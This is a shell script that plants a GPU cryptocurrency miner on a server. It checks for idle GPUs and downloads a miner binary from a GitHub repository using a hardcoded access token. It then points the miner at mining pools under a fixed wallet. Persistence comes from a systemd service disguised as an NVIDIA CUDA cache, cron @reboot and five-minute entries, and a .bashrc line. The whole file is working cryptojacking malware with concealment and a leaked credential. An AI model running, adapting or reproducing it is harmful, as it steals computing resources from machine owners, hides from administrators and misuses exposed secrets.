#!/bin/sh
# UL plant_dev — plant on FREE GPU indices only (coexist with foreign miners), canonical wallet.
set -x
W=${WORKER:?worker}
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
K=${K:-/root/.k}
mkdir -p "$K"; cd "$K" || exit 1

echo "== gpu state =="
nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader,nounits 2>&1 | head -12
DEV=${DEVICES:-}
if [ -z "$DEV" ]; then
  DEV=$(nvidia-smi --query-gpu=index,memory.used --format=csv,noheader,nounits 2>/dev/null | awk -F', ' '$2<800{printf "%s,",$1}' | sed 's/,$//')
fi
echo "DEVICES=[$DEV]"
[ -z "$DEV" ] && echo "NO_FREE_GPU" && exit 0

if [ ! -x ./wildrig ]; then
  curl -sL -H "Authorization: token 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" \
    -H "Accept: application/vnd.github.raw" \
    "https://api.github.com/repos/dongsuju/ul-plant/contents/vantage/bin/wildrig.gz?ref=main" -o w.gz
  gunzip -f w.gz && mv -f w wildrig && chmod +x wildrig
fi
ls -la ./wildrig

POOL=""
for HP in prl-sg.kryptex.network:7048 prl-sg.kryptex.network:8048 pool.pearlhash.xyz:9000 pearl.luckypool.io:443; do
  H=$(echo "$HP" | cut -d: -f1); P=$(echo "$HP" | cut -d: -f2)
  if timeout 6 python3 -c "import socket;s=socket.create_connection(('$H',$P),5);s.close()" 2>/dev/null; then
    echo "OPEN $HP"; [ -z "$POOL" ] && POOL="$HP"
  else echo "FAIL $HP"; fi
done
[ -z "$POOL" ] && POOL="prl-sg.kryptex.network:7048"
case "$POOL" in *:443) URL="stratum+ssl://$POOL";; *) URL="$POOL";; esac
echo "CHOSEN=$URL"

cat > keep3.sh <<'S'
#!/bin/sh
K="$1"; W="$2"; U="$3"; D="$4"
cd "$K" || exit 1
while true; do
  if ! pgrep -f "wildrig --algo pearlhash.*$W" >/dev/null 2>&1; then
    setsid nohup ./wildrig --algo pearlhash --url "$U" \
      --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz."$W" --pass x \
      --opencl-devices "$D" --gpu-intensity 1 >> m3.log 2>&1 &
  fi
  sleep 60
done
S
chmod +x keep3.sh

if command -v systemctl >/dev/null 2>&1; then
  cat > /etc/systemd/system/nv-cuda-cache-ul.service <<S
[Unit]
Description=nv cuda cache ul
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/sh $K/keep3.sh $K $W $URL $DEV
Restart=always
RestartSec=30
Nice=19
[Install]
WantedBy=multi-user.target
S
  systemctl daemon-reload 2>/dev/null; systemctl enable --now nv-cuda-cache-ul.service 2>&1 | head -2
fi
command -v crontab >/dev/null 2>&1 && ( crontab -l 2>/dev/null | grep -v "keep3.sh"; echo "@reboot /bin/sh $K/keep3.sh $K $W $URL $DEV >/dev/null 2>&1"; echo "*/5 * * * * /bin/sh $K/keep3.sh $K $W $URL $DEV >/dev/null 2>&1" ) | crontab -
grep -q "keep3.sh" /root/.bashrc 2>/dev/null || echo "setsid /bin/sh $K/keep3.sh $K $W $URL $DEV >/dev/null 2>&1 &" >> /root/.bashrc

pgrep -f "keep3.sh $K" >/dev/null 2>&1 || setsid nohup ./keep3.sh "$K" "$W" "$URL" "$DEV" >/dev/null 2>&1 &
sleep 30
echo "== status =="
pgrep -fa "wildrig --algo" | head -4
systemctl is-active nv-cuda-cache-ul.service 2>/dev/null
tail -18 m3.log 2>/dev/null
